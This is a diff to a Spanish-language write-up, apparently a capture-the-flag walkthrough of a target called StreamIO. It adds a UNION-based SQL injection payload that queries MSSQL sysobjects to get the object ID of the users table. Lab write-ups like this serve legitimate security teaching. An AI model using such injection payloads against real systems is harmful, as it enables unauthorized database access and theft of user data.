@@ -142,6 +142,12 @@ A continuacion buscaremos como listar las tablas
 ```
 
 Encontramos las tablas `movies` y la tabla `users`, asi que vamos a enumerar la tabla users
+En el valor 3 sacaremos el Id de la tabla de usuarios
+```sql
+'union select 1,name,id,4,5,6  from streamio..sysobjects where xtype='U';--
+```
+
+y ahora sacaremos el valor de esta tabla con identificador `901578250`
 
 
 
